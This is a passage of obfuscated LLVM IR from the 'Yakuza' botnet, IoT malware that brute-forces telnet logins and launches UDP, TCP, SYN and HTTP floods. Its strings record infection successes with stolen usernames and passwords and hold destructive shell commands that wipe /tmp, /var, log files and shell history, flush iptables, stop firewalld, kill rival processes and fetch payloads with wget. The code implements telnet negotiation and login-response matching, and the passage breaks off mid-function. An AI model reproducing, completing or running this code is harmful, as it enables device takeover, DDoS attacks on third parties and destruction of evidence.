@.str.123 = private unnamed_addr constant [7 x i8] c"LINKED\00", align 1
@.str.124 = private unnamed_addr constant [84 x i8] c"[ Yakuza ] Infection Success || IP: %s: || Port: 23 || Username: %s || Password: %s\00", align 1
@.str.125 = private unnamed_addr constant [72 x i8] c"[ Yakuza ] Failed || IP: %s || Port: 23 || Username: %s || Password: %s\00", align 1
@SendSTD.randstrings = private unnamed_addr constant [26 x i8*] [i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.151, i32 0, i32 0)], align 16
@.str.126 = private unnamed_addr constant [21 x i8] c"PozHlpiND4xPDPuGE6tq\00", align 1
@.str.127 = private unnamed_addr constant [21 x i8] c"tg57YSAcuvy2hdBlEWMv\00", align 1
@.str.128 = private unnamed_addr constant [21 x i8] c"VaDp3Vu5m5bKcfCU96RX\00", align 1
@.str.129 = private unnamed_addr constant [21 x i8] c"UBWcPjIZOdZ9IAOSZAy6\00", align 1
@.str.130 = private unnamed_addr constant [21 x i8] c"JezacHw4VfzRWzsglZlF\00", align 1
@.str.131 = private unnamed_addr constant [21 x i8] c"3zOWSvAY2dn9rKZZOfkJ\00", align 1
@.str.132 = private unnamed_addr constant [21 x i8] c"oqogARpMjAvdjr9Qsrqj\00", align 1
@.str.133 = private unnamed_addr constant [21 x i8] c"yQAkUvZFjxExI3WbDp2g\00", align 1
@.str.134 = private unnamed_addr constant [21 x i8] c"35arWHE38SmV9qbaEDzZ\00", align 1
@.str.135 = private unnamed_addr constant [21 x i8] c"kKbPlhAwlxxnyfM3LaL0\00", align 1
@.str.136 = private unnamed_addr constant [21 x i8] c"a7pInUoLgx1CPFlGB5JF\00", align 1
@.str.137 = private unnamed_addr constant [21 x i8] c"yFnlmG7bqbW682p7Bzey\00", align 1
@.str.138 = private unnamed_addr constant [21 x i8] c"S1mQMZYF6uLzzkiULnGF\00", align 1
@.str.139 = private unnamed_addr constant [21 x i8] c"jKdmCH3hamvbN7ZvzkNA\00", align 1
@.str.140 = private unnamed_addr constant [21 x i8] c"bOAFqQfhvMFEf9jEZ89M\00", align 1
@.str.141 = private unnamed_addr constant [21 x i8] c"VckeqgSPaAA5jHdoFpCC\00", align 1
@.str.142 = private unnamed_addr constant [21 x i8] c"CwT01MAGqrgYRStHcV0X\00", align 1
@.str.143 = private unnamed_addr constant [21 x i8] c"72qeggInemBIQ5uJc1jQ\00", align 1
@.str.144 = private unnamed_addr constant [21 x i8] c"zwcfbtGDTDBWImROXhdn\00", align 1
@.str.145 = private unnamed_addr constant [21 x i8] c"w70uUC1UJYZoPENznHXB\00", align 1
@.str.146 = private unnamed_addr constant [21 x i8] c"EoXLAf1xXR7j4XSs0JTm\00", align 1
@.str.147 = private unnamed_addr constant [21 x i8] c"lgKjMnqBZFEvPJKpRmMj\00", align 1
@.str.148 = private unnamed_addr constant [21 x i8] c"lSvZgNzxkUyChyxw1nSr\00", align 1
@.str.149 = private unnamed_addr constant [21 x i8] c"VQz4cDTxV8RRrgn00toF\00", align 1
@.str.150 = private unnamed_addr constant [13 x i8] c"YakuzaBotnet\00", align 1
@.str.151 = private unnamed_addr constant [13 x i8] c"Scarface1337\00", align 1
@.str.152 = private unnamed_addr constant [4 x i8] c"ALL\00", align 1
@.str.153 = private unnamed_addr constant [5 x i8] c"USYN\00", align 1
@.str.154 = private unnamed_addr constant [5 x i8] c"ASYN\00", align 1
@.str.155 = private unnamed_addr constant [2 x i8] c"-\00", align 1
@.str.156 = private unnamed_addr constant [4 x i8] c"SYN\00", align 1
@.str.157 = private unnamed_addr constant [4 x i8] c"RST\00", align 1
@.str.158 = private unnamed_addr constant [4 x i8] c"FIN\00", align 1
@.str.159 = private unnamed_addr constant [4 x i8] c"ACK\00", align 1
@.str.160 = private unnamed_addr constant [4 x i8] c"PSH\00", align 1
@.str.161 = private unnamed_addr constant [4 x i8] c"URG\00", align 1
@.str.162 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.163 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.164 = private unnamed_addr constant [285 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.165 = private unnamed_addr constant [48 x i8] c"Yakuza Botnet HTTP Flood In Progress. Fuck you.\00", align 1
@.str.166 = private unnamed_addr constant [43 x i8] c"rm -rf /tmp/* /var/* /var/run/* /var/tmp/*\00", align 1
@.str.167 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.169 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.170 = private unnamed_addr constant [12 x i8] c"iptables -F\00", align 1
@.str.171 = private unnamed_addr constant [17 x i8] c"pkill -9 busybox\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"pkill -9 perl\00", align 1
@.str.173 = private unnamed_addr constant [16 x i8] c"pkill -9 python\00", align 1
@.str.174 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.175 = private unnamed_addr constant [37 x i8] c"/sbin/iptables -F; /sbin/iptables -X\00", align 1
@.str.176 = private unnamed_addr constant [23 x i8] c"service firewalld stop\00", align 1
@.str.177 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.178 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.179 = private unnamed_addr constant [45 x i8] c"wget --no-check-certificate -q -O /tmp/null \00", align 1
@.str.180 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.181 = private unnamed_addr constant [5 x i8] c"ICMP\00", align 1
@.str.182 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.183 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.184 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.185 = private unnamed_addr constant [6 x i8] c"FLOAD\00", align 1
@.str.186 = private unnamed_addr constant [21 x i8] c"FLoad Mode Activated\00", align 1
@.str.187 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.188 = private unnamed_addr constant [8 x i8] c"HTTPHEX\00", align 1
@.str.189 = private unnamed_addr constant [8 x i8] c"HTTPTXT\00", align 1
@.str.190 = private unnamed_addr constant [5 x i8] c"WGET\00", align 1
@.str.191 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.192 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.193 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.194 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.195 = private unnamed_addr constant [6 x i8] c"CLEAN\00", align 1
@.str.196 = private unnamed_addr constant [19 x i8] c"[Cleaning] [%s:%s]\00", align 1
@.str.199 = private unnamed_addr constant [11 x i8] c"BIG_ENDIAN\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"LITTLE_ENDIAN\00", align 1
@.str.201 = private unnamed_addr constant [13 x i8] c"BIG_ENDIAN_W\00", align 1
@.str.202 = private unnamed_addr constant [16 x i8] c"LITTLE_ENDIAN_W\00", align 1
@.str.203 = private unnamed_addr constant [8 x i8] c"UNKNOWN\00", align 1
@.str.197 = private unnamed_addr constant [17 x i8] c"/etc/resolv.conf\00", align 1
@.str.198 = private unnamed_addr constant [39 x i8] c"nameserver 8.8.8.8\0Anameserver 8.8.4.4\0A\00", align 1
@.str.204 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.205 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.206 = private unnamed_addr constant [55 x i8] c"[\1B[96mBOT JOINED\1B[97m] Arch: \1B[96m%s \1B[97m|| Type: %s]\00", align 1
@.str.207 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.208 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define i8* @getBuild() #0 {
  ret i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.53, i32 0, i32 0)
}

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = sub i32 0, -1640531527
  %7 = sub i32 %5, %6
  %8 = add i32 %5, -1640531527
  store i32 %7, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %9 = load i32, i32* %2, align 4
  %10 = add i32 %9, -1283857946
  %11 = add i32 %10, -1640531527
  %12 = sub i32 %11, -1283857946
  %13 = add i32 %9, -1640531527
  %14 = sub i32 0, %12
  %15 = sub i32 0, -1640531527
  %16 = add i32 %14, %15
  %17 = sub i32 0, %16
  %18 = add i32 %12, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %19

; <label>:19:                                     ; preds = %60, %1
  %20 = load i32, i32* %3, align 4
  %21 = icmp slt i32 %20, 4096
  br i1 %21, label %22, label %66

; <label>:22:                                     ; preds = %19
  %23 = load i32, i32* %3, align 4
  %24 = sub i32 %23, -1699913535
  %25 = sub i32 %24, 3
  %26 = add i32 %25, -1699913535
  %27 = sub nsw i32 %23, 3
  %28 = sext i32 %26 to i64
  %29 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %28
  %30 = load i32, i32* %29, align 4
  %31 = load i32, i32* %3, align 4
  %32 = sub i32 0, 2
  %33 = add i32 %31, %32
  %34 = sub nsw i32 %31, 2
  %35 = sext i32 %33 to i64
  %36 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %35
  %37 = load i32, i32* %36, align 4
  %38 = xor i32 %30, -1
  %39 = and i32 %37, %38
  %40 = xor i32 %37, -1
  %41 = and i32 %30, %40
  %42 = or i32 %39, %41
  %43 = xor i32 %30, %37
  %44 = xor i32 %42, -1
  %45 = and i32 -1640531527, %44
  %46 = xor i32 -1640531527, -1
  %47 = and i32 %42, %46
  %48 = or i32 %45, %47
  %49 = xor i32 %42, -1640531527
  %50 = load i32, i32* %3, align 4
  %51 = xor i32 %48, -1
  %52 = and i32 %50, %51
  %53 = xor i32 %50, -1
  %54 = and i32 %48, %53
  %55 = or i32 %52, %54
  %56 = xor i32 %48, %50
  %57 = load i32, i32* %3, align 4
  %58 = sext i32 %57 to i64
  %59 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %58
  store i32 %55, i32* %59, align 4
  br label %60

; <label>:60:                                     ; preds = %22
  %61 = load i32, i32* %3, align 4
  %62 = sub i32 %61, 1187152278
  %63 = add i32 %62, 1
  %64 = add i32 %63, 1187152278
  %65 = add nsw i32 %61, 1
  store i32 %64, i32* %3, align 4
  br label %19

; <label>:66:                                     ; preds = %19
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = add i32 %5, -2021393693
  %7 = add i32 %6, 1
  %8 = sub i32 %7, -2021393693
  %9 = add i32 %5, 1
  %10 = xor i32 4095, -1
  %11 = xor i32 %8, %10
  %12 = and i32 %11, %8
  %13 = and i32 %8, 4095
  store i32 %12, i32* @rand_cmwc.i, align 4
  %14 = load i64, i64* %2, align 8
  %15 = load i32, i32* @rand_cmwc.i, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = zext i32 %18 to i64
  %20 = mul i64 %14, %19
  %21 = load i32, i32* @c, align 4
  %22 = zext i32 %21 to i64
  %23 = sub i64 0, %22
  %24 = sub i64 %20, %23
  %25 = add i64 %20, %22
  store i64 %24, i64* %1, align 8
  %26 = load i64, i64* %1, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %1, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = sub i64 %29, 5518309620771760048
  %33 = add i64 %32, %31
  %34 = add i64 %33, 5518309620771760048
  %35 = add i64 %29, %31
  %36 = trunc i64 %34 to i32
  store i32 %36, i32* %3, align 4
  %37 = load i32, i32* %3, align 4
  %38 = load i32, i32* @c, align 4
  %39 = icmp ult i32 %37, %38
  br i1 %39, label %40, label %51

; <label>:40:                                     ; preds = %0
  %41 = load i32, i32* %3, align 4
  %42 = sub i32 %41, -2092354254
  %43 = add i32 %42, 1
  %44 = add i32 %43, -2092354254
  %45 = add i32 %41, 1
  store i32 %44, i32* %3, align 4
  %46 = load i32, i32* @c, align 4
  %47 = sub i32 %46, 1382887693
  %48 = add i32 %47, 1
  %49 = add i32 %48, 1382887693
  %50 = add i32 %46, 1
  store i32 %49, i32* @c, align 4
  br label %51

; <label>:51:                                     ; preds = %40, %0
  %52 = load i32, i32* %4, align 4
  %53 = load i32, i32* %3, align 4
  %54 = sub i32 %52, -641739565
  %55 = sub i32 %54, %53
  %56 = add i32 %55, -641739565
  %57 = sub i32 %52, %53
  %58 = load i32, i32* @rand_cmwc.i, align 4
  %59 = zext i32 %58 to i64
  %60 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %59
  store i32 %56, i32* %60, align 4
  ret i32 %56
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  br label %8

; <label>:8:                                      ; preds = %18, %2
  %9 = load i8**, i8*** %5, align 8
  %10 = load i32, i32* %6, align 4
  %11 = sub i32 0, 1
  %12 = sub i32 %10, %11
  %13 = add nsw i32 %10, 1
  store i32 %12, i32* %6, align 4
  %14 = sext i32 %12 to i64
  %15 = getelementptr inbounds i8*, i8** %9, i64 %14
  %16 = load i8*, i8** %15, align 8
  %17 = icmp ne i8* %16, null
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %8
  br label %8

; <label>:19:                                     ; preds = %8
  store i32 0, i32* %7, align 4
  br label %20

; <label>:20:                                     ; preds = %35, %19
  %21 = load i32, i32* %7, align 4
  %22 = load i32, i32* %6, align 4
  %23 = icmp slt i32 %21, %22
  br i1 %23, label %24, label %41

; <label>:24:                                     ; preds = %20
  %25 = load i8*, i8** %4, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds i8*, i8** %26, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %25, i8* %30)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %34

; <label>:33:                                     ; preds = %24
  store i32 1, i32* %3, align 4
  br label %42

; <label>:34:                                     ; preds = %24
  br label %35

; <label>:35:                                     ; preds = %34
  %36 = load i32, i32* %7, align 4
  %37 = add i32 %36, -1536188710
  %38 = add i32 %37, 1
  %39 = sub i32 %38, -1536188710
  %40 = add nsw i32 %36, 1
  store i32 %39, i32* %7, align 4
  br label %20

; <label>:41:                                     ; preds = %20
  store i32 0, i32* %3, align 4
  br label %42

; <label>:42:                                     ; preds = %41, %33
  %43 = load i32, i32* %3, align 4
  ret i32 %43
}

declare i32 @strcasestr(...) #1

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([18 x i8*], [18 x i8*]* @successes, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_string(i8* %3, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @fails, i32 0, i32 0))
  ret i32 %4
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** %2, align 8
  %4 = call i32 @contains_success(i8* %3)
  %5 = icmp ne i32 %4, 0
  br i1 %5, label %10, label %6

; <label>:6:                                      ; preds = %1
  %7 = load i8*, i8** %2, align 8
  %8 = call i32 @contains_fail(i8* %7)
  %9 = icmp ne i32 %8, 0
  br label %10

; <label>:10:                                     ; preds = %6, %1
  %11 = phi i1 [ true, %1 ], [ %9, %6 ]
  %12 = zext i1 %11 to i32
  ret i32 %12
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca %struct.fd_set, align 8
  %11 = alloca %struct.timeval, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %6, align 4
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  %14 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 0
  store i64 0, i64* %14, align 8
  %15 = load i32, i32* %7, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.timeval, %struct.timeval* %11, i32 0, i32 1
  store i64 %16, i64* %17, align 8
  br label %18

; <label>:18:                                     ; preds = %4
  %19 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %20 = getelementptr inbounds [16 x i64], [16 x i64]* %19, i64 0, i64 0
  %21 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %20) #5, !srcloc !1
  %22 = extractvalue { i64, i64* } %21, 0
  %23 = extractvalue { i64, i64* } %21, 1
  %24 = trunc i64 %22 to i32
  store i32 %24, i32* %12, align 4
  %25 = ptrtoint i64* %23 to i64
  %26 = trunc i64 %25 to i32
  store i32 %26, i32* %13, align 4
  br label %27

; <label>:27:                                     ; preds = %18
  %28 = load i32, i32* %6, align 4
  %29 = srem i32 %28, 64
  %30 = zext i32 %29 to i64
  %31 = shl i64 1, %30
  %32 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %10, i32 0, i32 0
  %33 = load i32, i32* %6, align 4
  %34 = sdiv i32 %33, 64
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds [16 x i64], [16 x i64]* %32, i64 0, i64 %35
  %37 = load i64, i64* %36, align 8
  %38 = and i64 %37, %31
  %39 = xor i64 %37, %31
  %40 = or i64 %38, %39
  %41 = or i64 %37, %31
  store i64 %40, i64* %36, align 8
  %42 = load i32, i32* %6, align 4
  %43 = sub i32 0, 1
  %44 = sub i32 %42, %43
  %45 = add nsw i32 %42, 1
  %46 = call i32 @select(i32 %44, %struct.fd_set* %10, %struct.fd_set* null, %struct.fd_set* null, %struct.timeval* %11)
  %47 = icmp slt i32 %46, 1
  br i1 %47, label %48, label %49

; <label>:48:                                     ; preds = %27
  store i32 0, i32* %5, align 4
  br label %56

; <label>:49:                                     ; preds = %27
  %50 = load i32, i32* %6, align 4
  %51 = load i8*, i8** %8, align 8
  %52 = load i32, i32* %9, align 4
  %53 = sext i32 %52 to i64
  %54 = call i64 @recv(i32 %50, i8* %51, i64 %53, i32 0)
  %55 = trunc i64 %54 to i32
  store i32 %55, i32* %5, align 4
  br label %56

; <label>:56:                                     ; preds = %49, %48
  %57 = load i32, i32* %5, align 4
  ret i32 %57
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #1

declare i64 @recv(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8**) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %7, align 4
  store i32 %1, i32* %8, align 4
  store i8* %2, i8** %9, align 8
  store i32 %3, i32* %10, align 4
  store i8** %4, i8*** %11, align 8
  %14 = load i8*, i8** %9, align 8
  %15 = load i32, i32* %10, align 4
  %16 = sext i32 %15 to i64
  call void @llvm.memset.p0i8.i64(i8* %14, i8 0, i64 %16, i32 1, i1 false)
  %17 = load i32, i32* %7, align 4
  %18 = load i32, i32* %8, align 4
  %19 = load i8*, i8** %9, align 8
  %20 = load i32, i32* %10, align 4
  %21 = call i32 @read_with_timeout(i32 %17, i32 %18, i8* %19, i32 %20)
  store i32 %21, i32* %12, align 4
  %22 = load i8*, i8** %9, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 0
  %24 = load i8, i8* %23, align 1
  %25 = sext i8 %24 to i32
  %26 = icmp eq i32 %25, 255
  br i1 %26, label %27, label %31

; <label>:27:                                     ; preds = %5
  %28 = load i32, i32* %7, align 4
  %29 = load i8*, i8** %9, align 8
  %30 = call i32 @negotiate(i32 %28, i8* %29, i32 3)
  br label %31

; <label>:31:                                     ; preds = %27, %5
  %32 = load i8*, i8** %9, align 8
  %33 = load i8**, i8*** %11, align 8
  %34 = call i32 @contains_string(i8* %32, i8** %33)
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %31
  store i32 1, i32* %6, align 4
  br label %38

; <label>:37:                                     ; preds = %31
  store i32 0, i32* %6, align 4
  br label %38

; <label>:38:                                     ; preds = %37, %36
  %39 = load i32, i32* %6, align 4
  ret i32 %39
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #2

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8, align 1
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %9 = load i8*, i8** %6, align 8
  %10 = getelementptr inbounds i8, i8* %9, i64 1
  %11 = load i8, i8* %10, align 1
  %12 = zext i8 %11 to i32
  switch i32 %12, label %61 [
    i32 255, label %13
    i32 251, label %14
    i32 252, label %14
    i32 253, label %14
    i32 254, label %14
  ]

; <label>:13:                                     ; preds = %3
  store i32 0, i32* %4, align 4
  br label %63

; <label>:14:                                     ; preds = %3, %3, %3, %3
  store i8 -1, i8* %8, align 1
  %15 = load i32, i32* %5, align 4
  %16 = call i64 @send(i32 %15, i8* %8, i64 1, i32 16384)
  %17 = load i8*, i8** %6, align 8
  %18 = getelementptr inbounds i8, i8* %17, i64 1
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 252, %20
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %14
  store i8 -2, i8* %8, align 1
  br label %54

; <label>:23:                                     ; preds = %14
  %24 = load i8*, i8** %6, align 8
  %25 = getelementptr inbounds i8, i8* %24, i64 1
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 254, %27
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %23
  store i8 -4, i8* %8, align 1
  br label %53

; <label>:30:                                     ; preds = %23
  %31 = load i8*, i8** %6, align 8
  %32 = getelementptr inbounds i8, i8* %31, i64 1
  %33 = load i8, i8* %32, align 1
  %34 = zext i8 %33 to i32
  %35 = icmp eq i32 3, %34
  br i1 %35, label %36, label %44

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %6, align 8
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = load i8, i8* %38, align 1
  %40 = zext i8 %39 to i32
  %41 = icmp eq i32 %40, 253
  %42 = select i1 %41, i32 251, i32 253
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %8, align 1
  br label %52

; <label>:44:                                     ; preds = %30
  %45 = load i8*, i8** %6, align 8
  %46 = getelementptr inbounds i8, i8* %45, i64 1
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 253
  %50 = select i1 %49, i32 252, i32 254
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %8, align 1
  br label %52

; <label>:52:                                     ; preds = %44, %36
  br label %53

; <label>:53:                                     ; preds = %52, %29
  br label %54

; <label>:54:                                     ; preds = %53, %22
  %55 = load i32, i32* %5, align 4
  %56 = call i64 @send(i32 %55, i8* %8, i64 1, i32 16384)
  %57 = load i32, i32* %5, align 4
  %58 = load i8*, i8** %6, align 8
  %59 = getelementptr inbounds i8, i8* %58, i64 2
  %60 = call i64 @send(i32 %57, i8* %59, i64 1, i32 16384)
  br label %62

; <label>:61:                                     ; preds = %3
  br label %62

; <label>:62:                                     ; preds = %61, %54
  store i32 0, i32* %4, align 4
  br label %63

; <label>:63:                                     ; preds = %62, %13
  %64 = load i32, i32* %4, align 4
  ret i32 %64
}

declare i64 @send(i32, i8*, i64, i32) #1

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t*) #0 {
